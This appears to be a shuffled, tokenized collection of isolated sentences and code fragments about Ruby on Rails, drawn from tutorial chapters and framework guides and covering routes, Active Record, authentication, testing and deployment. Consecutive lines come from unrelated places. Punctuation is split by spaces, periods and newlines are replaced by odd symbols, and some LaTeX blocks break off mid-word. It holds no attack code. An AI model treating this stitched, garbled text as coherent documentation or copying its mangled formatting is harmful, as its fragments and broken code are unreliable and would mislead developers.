Now the test suite for users with invalid information should be green :
In this case , it &apos;s the symbol ` : article` ▖
HTTP request headers have a Referer , User-Agent ( client software ) , and Cookie field , among others ▖
delete ╼ user
create app / views / users / _ form ▖ html ▖ erb
# = &gt; &lt; input id = &quot; url &quot; name = &quot; url &quot; type = &quot; url &quot; / &gt;
Applying the results of the above discussion yields the succinct \ kode { current \ _ user } method shown in Listing ~ \ ref { code : current _ user } .
To distinguish between these two cases , we &apos;ll adopt the terminology of \ emph { active } and \ emph { passive } relationships : if Calvin is following Hobbes but not vice versa , Calvin has an active relationship with Hobbes and Hobbes has a passive relationship with Calvin
╼ \ end { enumerate } ╼ ╼ % subsection login _ upon _ signup ( end ) ╼ ╼ % section login _ success ( end ) ╼ ╼ \ section { Logging out } % ( fold ) ╼ \ label { sec : logging _ out } ╼ ╼
* How to automatically create paths and URLs using route helpers .
For more details on the kind of callbacks supported by Active Record , see the \ href { http : / / guides ▖ rubyonrails ▖ org / v3 ▖ 2 ▖ 13 / active _ record _ validations _ callbacks ▖ html } { discussion of callbacks at the Rails Guides } .
&lt; % = render &#91; customer1 , employee1 , customer2 , employee2 &#93; % &gt;
move file ( rename )
following
&lt; % = render template : &quot; layouts / application &quot; % &gt;
As shown in Figure ~ \ ref { fig : cloud9 _ new _ workspace } , create a workspace called ``rails-tutorial &apos; &apos; ( \ emph { not } ``rails \ _ tutorial &apos; &apos; ) , set it to ``Private to the people I invite &apos; &apos; , and select the icon for the Rails Tutorial ( \ emph { not } the icon for Ruby on Rails )
$ cd workspace /
* Asset manifest files ( `application ▖ js` and `application ▖ css` )
To get the application &apos;s database to work , you &apos;ll also have to migrate the production database :
RSS feed
( There is no relationship between this \ kode { respond \ _ to } and the \ kode { respond \ _ to } used in the RSpec examples ▖ )
# via a model
nd ╼ end ╼ end ╼ \ end { code } ╼ \ end { codelisting } ╼ ╼ % subsection scopes _ subselects _ and _ a _ lambda ( end ) ╼ ╼ \ section { Conclusion } % ( fold ) ╼ \ label { sec : following _ conclusion } ╼ ╼
Routes should be included in your testing strategy ( just like the rest of your application ) ▖
As usual , you can also push the code and deploy the application if you want :
&lt; / div &gt;
# # # Deep duplicating
NOTE : The `root` route only routes `GET` requests to the action .
The result appears in Listing ~ \ ref { code : micropost _ instance _ variable }
In your view template you could use something like
# # # ` : on`
&#91; 0 , 1 , -5 , 1 , 1 , &quot; foo &quot; , &quot; bar &quot; &#93; ▖ split ( 1 )
Did you know that \ kode { &quot; Michael Hartl &quot; @ example ▖ com } , with quotation marks and a space in the middle , is a valid email address according to the standard ?
╼ ╼ \ subsection { What we learned in this chapter } % ( fold ) ╼ \ label { sec : advanced _
A successful password reset .
@ ips ▖ include ? (
This is ╼ mostly useful together with the ` : through` option .
First make sure your changes are the only difference between your current branch and master :
Rails ▖ application ▖ config ▖ before _ initialize do
When using the console , type Ctrl-C if you get stuck , or Ctrl-D to exit the console altogether .
* `app / views / layouts / application ▖ html ▖ erb`
There are several ways of getting similar results with different sub-templating schemes using this technique ▖
in the sample app ( Listing ~ \ ref { code : home _ root _ route } ) .
# # # Active Record as an ORM Framework
As you proceed through this tutorial , in all likelihood you will occasionally be tripped up by things not immediately working as expected .
But if you &apos;re planning to submit your change back for inclusion in Rails , keep a few things in mind :
&#124; test / fixtures / comments ▖ yml &#124; Sample comments for use in testing &#124;
When an engine is generated , there is a smaller dummy application created inside ╼ it at `test / dummy` ▖
As you know , the Controller is responsible for orchestrating the whole process of handling a request in Rails , though it normally hands off any heavy code to the Model ▖
$ rails generate controller StaticPages home help --no-test-framework
then the router will generate the path ` / patients / 17` ▖
* &#91; Railscasts : Turbolinks &#93; ( http : / / railscasts ▖ com / episodes / 390-turbolinks )
Next , we need to assemble some test data , which we can do by adding some relationships fixtures to create following / follower relationships .
class AdminMailer &lt; ActionMailer : : Base
RESTful routes provided by the Password Resets resource in Listing ~ \ ref { code : password _ resets _ resource } .
Note the use of the \ kode { full \ _ title } helper from Listing ~ \ ref { code : title _ helper } to test the page &apos;s title , which we gain access to by including the Application Helper module into the test
As you can see , after duplicating the `Array` instance , we got another object , therefore we can modify it and the original object will stay unchanged ▖
Rails 3 ▖ x signed , but did not encrypt , the contents of cookie-based session ▖
The result should look something like Figure ~ \ ref { fig : demo _ micropost _ index } .
Tests allow code to be \ emph { refactored } ( i ▖ e ▖ , changing its form without changing its function ) with greater confidence .
In this section , we &apos;ll start by remembering user logins by default , expiring their sessions only when they explicitly log out .
The actual HTML generated by this ERb isn &apos;t particularly relevant , but you might be curious , so here &apos;s a peek at a schematic view ( details may differ ) :
See Section ~ \ ref { sec : sample _ app _ setup } for more information .
has _ and _ belongs _ to _ many : assemblies ,
Having defined a basic user page in the previous section , we &apos;ll now flesh it out a little with a profile image for each user and the first cut of the user sidebar .
A detailed diagram of MVC in Rails .
Applying this idea to all three static pages gives the tests shown in Listing ~ \ ref { code : title _ tests } .
def set _ delivery _ options
# # # # `underscore`
match start of a string
The inheritance structure for controllers is only slightly more complicated .
`assert _ recognizes` is the inverse of `assert _ generates` ▖
The result is the user \ href { http : / / localhost : 3000 / users / 1 } { \ texttt { show } } page , as seen in Figure ~ \ ref { fig : demo _ show _ user _ rails _ 3 } .
I also had to install a \ href { https : / / en ▖ wikipedia ▖ org / wiki / YAML } { YAML } library :
in Listing ~ \ ref { code : user _ show _ page _ test } .
collect { &#124; e &#124; e ▖ to _ param } ▖ join &apos; / &apos;
Now that we &apos;ve updated the \ kode { README } , we can push the changes up to GitHub to see the result .
The regex matches the text of the line in the scenario , and the contents of the block are the Ruby code needed to implement the step .
Client ▖ order ( orders _ count : : asc , created _ at : : desc )
In the previous example it could be the case that ` : log _ level` does not belong to the public interface of the library and it is only used for development ▖
As with \ kode { paginate } , we can use the \ kode { count } method through the association .
# Handle a successful save .
When you pass a collection to a partial via the ` : collection` option , the partial will be inserted once for each member in the collection :
# # # # Rendering raw body
If you were to leave off the `main _ app` &quot; routing proxy &quot; ╼ method call , it could potentially go to the engine &apos;s or application &apos;s root , ╼ depending on where it was called from .
The signin form after trying to access a protected page ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / protected _ sign _ in _ bootstrap-full ▖ png } { ( full size ) }
The main difference between this and the signin form is that we have no Session model , and hence no analogue for the \ kode { @ user } variable .
The user show page with a custom Gravatar .
* `assert _ recognizes`
Roll your own authentication system
&lt; % = image _ tag &quot; home ▖ gif &quot; % &gt;
) ╼ ╼ \ subsection { What we learned in this chapter } % ( fold ) ╼ \ label { sec : filling _ in _ the _ layout _ what _ we _ learned _ in _ this _ chapter } ╼ ╼ \ begin { itemize } ╼ ╼ \ item
* ` : primary _ key`
te } ╼ ╼ % subsection the _ finished _ signup _ form ( end ) ╼ ╼ \ subsection { The flash } % ( fold ) ╼ \ label { sec : the _ flash } ╼ ╼
The corresponding web page appears in Figure ~ \ ref { fig : home _ view _ full _ html }
( Here I &apos;ve also added the optional RVM gemset line for convenience .
Use the article &quot; an &quot; for &quot; SQL &quot; , as in &quot; an SQL statement &quot; ▖
We &apos;ll start by adding a delete link for each user on the user index page , restricting access to administrative users .
The important point is that \ emph { you do not need to understand RSpec &apos;s syntax to be able to use RSpec } ▖ It may seem like magic at first , but RSpec and Capybara are designed to read more or less like English , and if you follow the examples in this tutorial you &apos;ll pick it up fairly quickly .
Now that we &apos;ve put our project under version control with Git , it &apos;s time to push our code up to \ href { http : / / www ▖ bitbucket ▖ com } { Bitbucket } , a site optimized for hosting and sharing Git repositories .
render &quot; edit ▖ html ▖ erb &quot;
In Section ~ \ ref { sec : changing _ the _ layout _ links } , we &apos;ll change the links on the application layout , including a URL to the current user &apos;s profile .
Even for experienced Rails developers , installing Ruby , Rails , and all the associated supporting software can be an exercise in frustration .
$ rake blorgh : install : migrations
╼ is the sample application for the tutorial .
) , the
# # # # Response Splitting
payment _ type = = &quot; card &quot;
# # # Changes in JSON handling
&lt; html &gt;
If you &apos;d like to refactor other tests to use \ kode { full \ _ title } ( such as those in Listing ~ \ ref { code : base _ title _ test } ) , you should include the Application Helper in \ kode { test \ _ helper ▖ rb } instead .
resources : publishers do
The result would be that , by passing in the entire \ kode { params } hash to \ kode { User ▖ new } , we would allow any user of the site to gain administrative access by including \ kode { admin = &apos; 1&apos; } in the web request .
Most editors that do not already default to UTF-8 ( such as ╼ some versions of Dreamweaver ) offer a way to change the default to UTF-8 ▖
A helper to wrap long words .
* = require _ tree .
Loading development environment
# # # Generating an Article Resource
if @ logger ▖ try ( : debug ? )
= &gt; &quot; Example User &lt; user @ example ▖ com &gt; &quot;
This is because the application doesn &apos;t know how ╼ to route these requests to the engine unless you explicitly tell it * * how * * ▖
Anything in the tags will be evaluated as Ruby code ▖
In these cases make sure you run `bundle update` to get the right version of the dependency and commit the `Gemfile ▖ lock` file within your changes .
edit _ user GET / users / : id / edit ( ▖ : format ) users # edit
Thanks to reader Cosmo Lee for convincing me to change the terminology and for offering suggestions on how to make it clearer .
In Chapter ~ \ ref { cha : account _ activation _ and _ password _ resets } , we &apos;ll make \ emph { sure } of email validity by adding a separate \ emph { account activation } step to user signup .
The macros `mattr _ reader` , `mattr _ writer` , and `mattr _ accessor` are the same as the `cattr _ * ` macros defined for class ▖
&lt; % = render &quot; shared / menu &quot; % &gt;
You can enable or disable it in your configuration through the ╼ `config ▖ assets ▖ digest` option .
First name : &lt; % = person _ form ▖ text _ field : first _ name % &gt;
As seen in Listing ~ \ ref { code : friendly _ forwarding _ test } , the resulting test tries to visit the edit page , then logs in , and then checks that the user is redirected to the \ emph { edit } page instead of the default profile page .
To include `app / assets / stylesheets / main ▖ css` and `app / assets / stylesheets / columns ▖ css` :
After restarting the web server to incorporate the changes into the development application ( by pressing Ctrl-C and then running \ kode { rails server } as in Section ~ \ ref { sec : rails _ server } ) , the results appear as in Figure ~ \ ref { fig : sample _ app _ only _ bootstrap } .
This can mean better performance for ╼ a large or often-running query ▖
( In the unlikely event that finding the count is still a bottleneck in your application , you can make it even faster using a \ href { http : / / railscasts ▖ com / episodes / 23-counter-cache-column } { \ emph { counter cache } } ▖ )
Adds the `vendor` , `lib` , all directories of `app` and any paths specified by `config ▖ load _ paths` to ` $ LOAD _ PATH` .
$ mkdir workspace
* ` : location`
The profile of a user to follow , with a follow button .
# # # `find _ or _ create _ by !
Arrays work the same way as strings :
We can see the result of all this work by signing up our first user under the name ``Rails Tutorial &apos; &apos; and email address `` \ texttt { example @ railstutorial ▖ org } &apos; &apos; .
# # # Functional Tests
# with SQLite , MySQL , and PostgreSQL )
╼ ╼ % subsection back _ to _ the _ title _ helper ( end ) ╼ ╼ \ section { Other data structures } % ( fold ) ╼ \ label { sec : other _ data _ structures } ╼ ╼
We come now to the heart of the Relationship associations : \ kode { followed \ _ users } and \ kode { followers } .
has _ many : parts , through : : manifests
There &apos;s an additional complication , though : we want to \ emph { associate } each micropost with a particular user ▖ We &apos;ll accomplish this by recording the \ kode { user \ _ id } of the owner of the post .
If you have a more advanced constraint , you can provide an object that responds to `matches ? ` that Rails should use ▖
The User model for the toy application .
# # # # # CDN Header Debugging
Of course , we can optionally deploy the app to Heroku even at this early stage :
\ label { fig : home _ page _ feed _ mockup } } ╼ \ end { figure } ╼ ╼ % section the _ status _ feed ( end ) ╼ ╼ \ subsection { Motivation and strategy } % ( fold ) ╼ \ label { sec : motivation _ and _ strategy } ╼ ╼
Active Record
Taken together , the material in Chapter ~ \ ref { cha : modeling _ users } through Chapter ~ \ ref { cha : account _ activation _ and _ password _ reset } develops a full Rails login and authentication system .
identical app / assets / stylesheets / scaffolds ▖ css ▖ scss
# # # Enqueue the Job
* * `ActiveRecord : : QueryCache` * *
Next , we &apos;ll use a text editor to update the \ kode { Gemfile } needed by Bundler with the contents of Listing ~ \ ref { code : demo _ gemfile _ sqlite _ version _ redux } .
ActiveSupport : : Concern manages load order of interlinked dependent modules and ╼ classes at run time allowing you to significantly modularize your code .
For example , \ kode { &quot; FooBar &quot; ▖ underscore } is \ kode { &quot; foo \ _ bar &quot; } , so the foreign key for a \ kode { FooBar } object would be \ kode { foo \ _ bar \ _ id } .
A `has _ many` association indicates a one-to-many connection with another model ▖
match &apos; photos &apos; , to : &apos; photos # show &apos; , via : : all
Formats the bytes in size into a more understandable representation ; useful for reporting file sizes to users .
This means that ╼ symbol access is no longer supported ▖
ActiveRecord : : FixtureSet ▖ context _ class ▖ send : include , FixtureFileHelpers
In Chapter ~ \ ref { cha : updating _ showing _ and _ deleting _ users } , we finished making a basic Users resource ( filling in all the standard REST actions from Table ~ \ ref { table : RESTful _ users } ) , together with a flexible authentication and authorization system .
It is these files that we need to create and edit in order to update the user profile page upon being followed or unfollowed .
If you &apos;re on a different platform , or if you &apos;re using a different editor , you should replace this command as necessary ( i ▖ e ▖ , by double-clicking the application icon or by using an alternate command such as \ kode { mate } , \ kode { vim } , \ kode { gvim } , or \ kode { mvim } ) .
A detailed diagram of MVC in Rails .
This ╼ allows you to either lock down the current behavior by setting the option to ╼ ` : sorted` , or opt into the future behavior by setting the option to ` : random` .
For example , to manipulate the \ kode { follow \ _ form } element , we will use the syntax
As shown in Listing ~ \ ref { code : ssl _ in _ production } , all we need to do is set the \ kode { config } variable to force the use of SSL in production .
For example , for the first user in the database this array appears as follows :
N ▖ name # = &gt; &quot; N &quot;
( You may recall that we ran this command in a similar context in Section ~ \ ref { sec : demo _ users _ resource } ▖ )
DELETE
This is because when controllers ╼ are generated in Rails they are empty by default , unless you tell it ╼ your wanted actions during the generation process .
The \ kode { any ? } \ method is just the opposite of \ kode { empty ? } , returning \ kode { true } if there are any elements present and \ kode { false } otherwise .
Consider , for example , the \ texttt { email } attribute created by the migration in Listing ~ \ ref { code : users _ migration } .
SQL ( 0 ▖ 8ms ) COMMIT
# &lt; branch &gt; origin / master &lt; / branch &gt;
$ bundle exec rake TEST = test / cases / associations / has _ many _ associations _ test ▖ rb
# Do not compress assets
If you do need a lot of static pages , take a look at the \ href { https : / / github ▖ com / thoughtbot / high _ voltage } { \ texttt { high \ _ voltage } } gem .
# # # Asset Tag Helpers
* `edit _ photo _ path ( : id ) ` returns ` / photos / : id / edit` ( for instance , `edit _ photo _ path ( 10 ) ` returns ` / photos / 10 / edit` )
-e &quot; signup with invalid information &quot;
# # # Using `render`
from : &apos; notification @ example ▖ com&apos;
How to Load Core Extensions
create app / helpers / microposts _ helper ▖ rb
( The strange notation \ kode { : users } is a \ emph { symbol } , which we &apos;ll learn about in Section ~ \ ref { sec : hashes _ and _ symbols } ▖ )
In preparation for adding users to our site in Chapter ~ \ ref { cha : sign _ up } , the first \ kode { link \ _ to } creates a stub link of the form
# # # Active Resource
# = &gt; &#91; # &lt; Client id : 1 , first _ name : &quot; Lifo &quot; &gt; , # &lt; Client id : 10 , first _ name : &quot; Ryan &quot; &gt; &#93;
The Users controller with the debugger line removed .
To associate a model with a model in a different namespace , you must specify the complete class name in your association declaration :
Set to ` : log` or ` : raise` to enable ▖
Multiline regexps are disallowed for route requirements and this flag eases enforcing that constraint .
* Controlling caching
This also gives us a chance to make the work from the previous sections feel more concrete ; merely getting the test suite to pass may seem anti-climactic , and it will be gratifying to see an actual user record in the development database .
method = instance _ method ( method _ name )
Our strategy will be to describe the results of a typical browser hit---a visit to the user index page at \ href { http : / / localhost : 3000 / users } { / users } ---in terms of MVC ( Figure ~ \ ref { fig : mvc _ detailed } ) .
If for any reason something went wrong , you can always reset the database as follows :
# = &gt; # &lt; ActiveSupport : : TimeZone : 0x7f73654d4f38 @ utc _ offset = nil , @ name = &quot; Madrid &quot; , ▖ ▖ .
Now we &apos;re ready to start filling in that empty file with custom fixtures of our own .
Oh dear !
&#124; &#124; 204 &#124; : no _ content &#124;
Because our User model doesn &apos;t currently have any validations , the initial test should pass :
See the file `activerecord / RUNNING _ UNIT _ TESTS ▖ rdoc` for information on running more targeted database tests , or the file `ci / travis ▖ rb` for the test suite run by the continuous integration server .
Use `bundle show &#91; gemname &#93; ` to see where a bundled ╼ gem is installed .
In Chapter ~ \ ref { cha : updating _ showing _ and _ deleting _ users } , we will allow all users to update their account information , and we will allow site administrators to delete users , thereby completing the full suite of Users resource REST actions from Table ~ \ ref { table : RESTful _ users } .
resources : messages do
This will return single order objects for each day , but only those that are ordered more than $ 100 in a day .
With that configuration in place , we can start Guard and Spork at the same time with the \ kode { guard } command :
A mockup of a user &apos;s Home page with a status feed .
This ╼ action needs to be created , which can be done by putting the following lines ╼ inside the class definition in `app / controllers / blorgh / comments _ controller ▖ rb` :
# &lt; bar type = &quot; integer &quot; &gt; 2 &lt; / bar &gt;
Finally , you can deploy to Heroku :
&quot; invoices &quot; ▖ classify # = &gt; &quot; Invoice &quot;
If you don &apos;t have multiple `member` routes , you can also pass ` : on` to a ╼ route , eliminating the block :
This is your application &apos;s _ routing file _ which holds entries in a special DSL ╼ ( domain-specific language ) that tells Rails how to connect incoming requests to ╼ controllers and actions ▖
# # # # `pluralize`
* FROM &quot; articles &quot; WHERE ( id &gt; 10 ) ORDER BY id desc LIMIT 20
Since Ruby implicitly returns the value of the last expression in a function , here the \ texttt { foo } method returns \ texttt { &quot; bar &quot; } or \ texttt { &quot; baz &quot; } depending on whether \ texttt { boolean ? } \ is \ texttt { true } or \ texttt { false } .
As with the forthcoming sample application , the toy app will consist of \ emph { users } and their associated \ emph { microposts } ( thus constituting a minimalist Twitter-style app ) .
def set _ cookie
Because we will be finding relationships by \ kode { follower \ _ id } and by \ kode { followed \ _ id } , we should add an index on each column for efficiency , as shown in Listing ~ \ ref { code : relationships _ migration } .
Asset tag helpers provide methods for generating HTML that link views to feeds , JavaScript , stylesheets , images , videos and audios ▖
Action-level tests for admin access control ▖
, starting
Although the tutorial was originally designed for readers with some prior programming or web-development experience , in fact it has found a significant audience among beginning developers .
The Home page with follow stats .
The second important element is the \ kode { form } tag itself .
NOTE : Some features of Action View are tied to Active Record , but that doesn &apos;t mean Action View depends on Active Record ▖
Here \ kode { q5lt38hQDc \ _ 959PVoo6b7A } is a URL-safe base64 string generated by the \ kode { new \ _ token } method ( Listing ~ \ ref { code : token _ method } ) , and it plays the same role as the user id in / users / 1 / edit .
&#124; GET &#124; / photos &#124; images # index &#124; photos _ path &#124;
options _ from _ collection _ for _ select ( @ project ▖ people , &quot; id &quot; , &quot; name &quot; )
In Chapter ~ \ ref { cha : user _ microposts } and Chapter ~ \ ref { cha : following _ users } , we will use the association of users and microposts both to display all of a user &apos;s microposts and to construct a Twitter-like micropost feed .
with :
With the code in Listing ~ \ ref { code : user _ model _ password _ reset _ expired } , the \ kode { update } action in Listing ~ \ ref { code : password _ reset _ update _ action } should be working .
A template for using an instance variable in the \ kode { create } action .
This example , again , showed that a blacklist filter is never complete ▖
Typically , Action Controller will be concerned with communicating with the database and performing CRUD actions where necessary ▖
Active Support has the concept of _ ( html ) safe _ strings ▖
The `--mountable` option will add to the `--full` option :
Starting from scratch , in this chapter we created a working User model with name , email , and password attributes , together with validations enforcing several important constraints on their values .
= = = = = = = = = = = = = = = = = = = = = = = = = = = = = =
To see all the processes on your system , you can use the \ texttt { ps } command with the \ texttt { aux } options :
The only requirement for \ kode { has \ _ secure \ _ password } to work its magic is for the corresponding model to have an attribute called \ kode { password \ _ digest } ▖ (
( Catching errors of this nature is perhaps the most useful aspect of view specs .
As you might guess , substituting any other number for \ texttt { 0 } migrates to that version number , where the version numbers come from listing the migrations sequentially .
( Compare to \ kode { count : 2 } in Listing ~ \ ref { code : layout _ links _ test } , which checks for exactly two matching links ▖ )
Ruby on Rails ( or just ``Rails &apos; &apos; for short ) is a web development framework written in the Ruby programming language .
Instead of defining hashes one item at a time using square brackets , it &apos;s easy to use a literal representation with keys and values separated by ~ \ kode { = &gt; } , called a ``hashrocket &apos; &apos; :
Sign up
Mailer views are located in the `app / views / name _ of _ mailer _ class` directory ▖
In Chapter ~ \ ref { cha : user _ microposts } , the result was only a proto-feed ( Figure ~ \ ref { fig : home _ with _ proto _ feed } ) , but with the implementation in Listing ~ \ ref { code : feed _ final } as seen in Figure ~ \ ref { fig : home _ page _ with _ feed } the Home page now shows the full feed .
The routes file is located in the \ kode { config } directory , where Rails collects files needed for the application configuration ( Figure ~ \ ref { fig : config _ directory _ rails } ) .
If you want to make sure that , upon insertion , all of the records in the ╼ persisted association are distinct ( so that you can be sure that when you ╼ inspect the association that you will never find duplicate records ) , you should ╼ add a unique index on the table itself ▖
This line will require there to be a `has _ many` association for comments defined ╼ on the `Blorgh : : Article` model , which there isn &apos;t right now ▖
To ╼ use it , it must be referenced using `Blorgh ▖ author _ class` .
invoke scaffold _ controller
Returns a string of option tags for pretty much any time zone in the world .
As with \ kode { is \ _ logged \ _ in ? } , we &apos;ll avoid this issue by defining the test helper \ kode { log \ _ in \ _ as } in Listing ~ \ ref { code : test _ helper _ log _ in } .
Here &apos;s what it looks like :
As a first step in this process , this section contains some suggested extensions to the core application , as well as suggestions for further learning .
* `add _ routing _ paths` Loads ( by default ) all `config / routes ▖ rb` files ( in the application and railties , including engines ) and sets up the routes for the application .
Such functions are called \ emph { helpers } ; to see how to make a custom helper , let &apos;s start by examining the title line from Listing ~ \ ref { code : application _ layout _ redux } :
`prev _ week` is aliased to `last _ week` .
@ business = business
The `config` calls are evaluated before this happens .
config ▖ middleware ▖ delete &quot; Rack : : Lock &quot;
authenticated ? ( : remember , token )
d ▖ sunday # = &gt; Sun , 16 Sep 2012
To configure our application to use SendGrid , we need to fill out the \ href { https : / / en ▖ wikipedia ▖ org / wiki / Simple _ Mail _ Transfer _ Protocol } { SMTP } settings for our production environment .
Not coincidentally , we already have exactly the methods we need : the \ kode { User ▖ find \ _ by } method provided by Active Record ( Section ~ \ ref { sec : finding _ user _ objects } ) and the \ kode { authenticate } method provided by \ kode { has \ _ secure \ _ password } ( Section ~ \ ref { sec : user _ authentication } ) .
The new user page ( \ href { http : / / localhost : 3000 / users / new } { / users / new } ) .
For example `nil` , `true` , and `false` return themselves ▖
* &#91; Railscasts : Unobtrusive JavaScript &#93; ( http : / / railscasts ▖ com / episodes / 205-unobtrusive-javascript )
&lt; input id = &quot; person _ last _ name &quot; name = &quot; person &#91; last _ name &#93; &quot; type = &quot; text &quot; / &gt;
nick = Client ▖ find _ or _ initialize _ by ( first _ name : &apos; Nick &apos; )
Because of the migration in Listing ~ \ ref { code : add _ remember _ digest _ to _ users _ generated } , the User model already has a \ kode { remember \ _ digest } attribute , but it doesn &apos;t yet have a \ kode { remember \ _ token } attribute .
Because Rails creates a substantial number of auxiliary files along with the controller ( as seen in Listing ~ \ ref { code : generating _ pages } ) , this isn &apos;t as easy as removing the controller file itself ; undoing the generation means removing not only the principal generated file , but all the ancillary files as well .
The migration to add a boolean \ kode { admin } attribute to users .
where \ kode { cookies ▖ signed &#91; : user \ _ id &#93; } automatically decrypts the user id cookie .
Putting everything together gives the updated header partial shown in Listing ~ \ ref { code : layout _ login _ logout _ links } .
Handling the submission of the ``remember me &apos; &apos; checkbox .
All that &apos;s left is to actually start learning Rails !
For simplicity , Figure ~ \ ref { fig : naive _ user _ has _ many _ following } omits the \ kode { following } table &apos;s ~ \ kode { id } column .
By inheriting from the `Rails : : Engine` class , this gem notifies Rails that ╼ there &apos;s an engine at the specified path , and will correctly mount the engine ╼ inside the application , performing tasks such as adding the `app` directory of ╼ the engine to the load path for models , mailers , controllers and views .
strip _ tags ( &quot; Strip &lt; i &gt; these &lt; / i &gt; tags ! &quot; )
&lt; div id = &quot; top _ menu &quot; &gt; Top menu items here &lt; / div &gt;
Authorization tests for the Microposts controller ▖
&lt; td &gt; &lt; % = link _ to &apos; Destroy &apos; , article _ path ( article ) ,
def default _ helper _ module !
The previous example uses the ╼ ` : message` option to show how you can include the attribute &apos;s value .
config ▖ assets ▖ prefix = &quot; / some _ other _ path &quot;
If the associated object has already been retrieved from the database for this object , the cached version will be returned ▖
M ▖ name # = &gt; &quot; M &quot;
# Rails &gt; = 4 ▖ 1
What if an argument is nil ?
in Listing ~ \ ref { code : user _ model _ remember } .
in Listing ~ \ ref { code : following _ followers _ tests } .
If the given password matches the user &apos;s password , it should return the user ; otherwise , it should return \ kode { false } .
Text editors and command lines
As with account activation ( Listing ~ \ ref { code : account _ activation _ edit _ action } ) , this involves finding the user corresponding to the email address in \ kode { params &#91; : email &#93; } .
Myapp : : Application ▖ config ▖ secret _ token = &apos; existing secret token&apos;
# # # Output Safety
$ rake db : migrate
Because we don &apos;t need the Puma gem locally , Listing ~ \ ref { code : puma _ gemfile } puts it in the \ kode { : production } group .
This is particularly useful because Rails comes with many commands that can be run at the command line .
mattr _ accessor : mechanism
This uses the \ kode { return } keyword to return immediately if the remember digest is \ kode { nil } , which is a common way to emphasize that the rest of the method gets ignored in that case .
u ▖ name = &quot; David &quot;
Before , we redirected to the user &apos;s profile page ( Section ~ \ ref { sec : successful _ signups } ) , but that doesn &apos;t make sense now that we &apos;re requiring account activation .
The idea is to log in , visit the index path , verify the first page of users is present , and then confirm that pagination is present on the page .
The warning message for a not-yet-activated user .
To ╼ create it , run this command from the application root :
assert _ routing ( { path : &apos; photos &apos; , method : : post } , { controller : &apos; photos &apos; , action : &apos; create &apos; } )
╼ \ end { code } ╼ ╼ \ subsection { A problem with the data model ( and a solution ) } % ( fold ) ╼ \ label { sec : a _ problem _ with _ the _ data _ model } ╼ ╼
As a result , the admin tests should pass :
To understand classes a little more deeply , there &apos;s no substitute for making one of our own .
At this point , our test suite should be green :
Of course , to generate the new sample data we have to run the \ kode { db : populate } Rake task :
&lt; % = comment ▖ body % &gt;
&#124; DELETE &#124; / kategorien / : id &#124; categories # destroy &#124; category _ path ( : id ) &#124;
The comments below contain some suggestions for approaching the \ emph { Rails Tutorial } depending on your background .
A partial can use its own layout file , just as a view can use a layout ▖
* `scoped _ by _ ▖ ▖ ▖ ` becomes `where ( ▖ ▖ ▖ )
Note that the validator will be initialized * only once * for the whole application ╼ life cycle , and not on each validation run , so be careful about using instance ╼ variables inside it .
create _ account
Note that we have simply replaced \ kode { true } with \ kode { case \ _ sensitive : false } ; Rails infers in this case that \ kode { : uniqueness } should be \ kode { true } .
As in previous chapters , we will find it convenient to use the sample data Rake task to fill the database with sample relationships .
Other directories can be ╼ created in the `test` directory as well ▖
* Rails 4 ▖ 0 has deprecated `ActiveRecord : : Fixtures` in favor of `ActiveRecord : : FixtureSet` .
&lt; % = @ article ▖ title % &gt;
In the following example , ╼ we don &apos;t want names and surnames to begin with lower case .
Layouts can be used to render a common view template around the results of Rails controller actions ▖
class Article &lt; ActiveRecord : : Base
Rails routes / users to the \ kode { index } action in the Users controller .
The final step is to migrate the database :
* `config ▖ action _ dispatch ▖ default _ headers` is a hash with HTTP headers that are set by default in each response ▖
# # # `validates _ associated`
Rails defaults to using an SQLite database when creating a new project , but you can always change it later .
The current state of the signup page \ href { http : / / localhost : 3000 / signup } { / signup } ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / new _ signup _ page _ bootstrap-full ▖ png } { ( full size ) }
And now if you inspect the middleware stack , you &apos;ll find that `Rack : : Lock` is ╼ not a part of it .
As with arrays and ranges , hashes respond to the \ kode { each } method .
In this section , we &apos;ll reimplement the status feed in a way that scales better with the number of followed users .
Detailed Association Reference
create mode 100644 README ▖ rdoc
This section first gives a high-level overview of the asset pipeline , and then shows how to use \ emph { Sass } , a powerful tool for writing CSS .
Of course , \ kode { cookies } isn &apos;t \ emph { really } a hash , since assigning to \ kode { cookies } actually \ emph { saves } a piece of text on the browser , but part of the beauty of Rails is that it lets you ignore that detail and concentrate on writing the application .
in Listing ~ \ ref { code : following _ followers _ authorization _ test } .
Blacklists are never complete .
For example , if you pass a Proc object , the block you give the Proc will be given the `controller` instance , so the layout can be determined based on the current request :
as seen in Listing ~ \ ref { code : db _ populate } .
* `config ▖ action _ controller ▖ request _ forgery _ protection _ token` sets the token parameter name for RequestForgery ▖
This means ╼ that you need to require them yourself .
First , where are the parentheses ?
run Rails ▖ application ▖ routes
NOTE : Defined in `active _ support / core _ ext / object / deep _ dup ▖ rb` .
The ` : except` option specifies a route or list of routes that Rails should _ not _ create :
Showing a different user &apos;s followers .
HTML for the edit form defined in Listing ~ \ ref { code : user _ edit _ view } and shown in Figure ~ \ ref { fig : edit _ page } .
You may use the ` : if` ╼ option when you want to specify when the validation * * should * * happen ▖
As seen in Figure ~ \ ref { fig : micropost _ length _ error } , Rails renders \ emph { error messages } indicating that the micropost &apos;s content is too long .
# If you want to send the email now use # deliver _ now
To manually define an action inside a controller , all you need to do is to ╼ define a new method inside the controller ▖
The security landscape shifts and it is important to keep up to date , because missing a new vulnerability can be catastrophic ▖
Adding a length validation for the \ kode { name } attribute ▖
Date : Tue , 12 Apr 2005 22 : 09 : 07 GMT
I &apos;m learning Ruby on Rails with the @ railstutorial !
In this section , we &apos;ll add the last of the basic User attributes : a secure password used to authenticate users of the sample application .
Verifying that the test suite still passes gives us confidence that this code refactoring was successful :
Tests for trying to edit as the wrong user ▖
The inverse of `pluralize` :
A mockup of the signup failure page ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / signup _ failure _ mockup _ bootstrap-full ▖ png } { ( full size ) }
You may have noticed that the new user object had \ kode { nil } values for the \ kode { id } and the magic columns \ kode { created \ _ at } and \ kode { updated \ _ at } attributes .
* Rails 4 ▖ 0 removed the `ActionController : : Base ▖ asset _ path` option ▖
CSS for the signup form .
The account activation HTML view .
╼ = &gt; 6
# # # Serialized attributes
Here we &apos;re using the Unix \ kode { ls } command to list the contents of the \ kode { app / controllers / } directory and the \ kode { rm } command to remove it .
The result appears in Listing ~ \ ref { code : sessions _ helper _ authenticate }
The new password resets form has a lot in common with Listing ~ \ ref { code : signin _ form _ redux } ; the most important differences are the use of a different resource and URL in the call to \ kode { form \ _ for } and the omission of the password attribute .
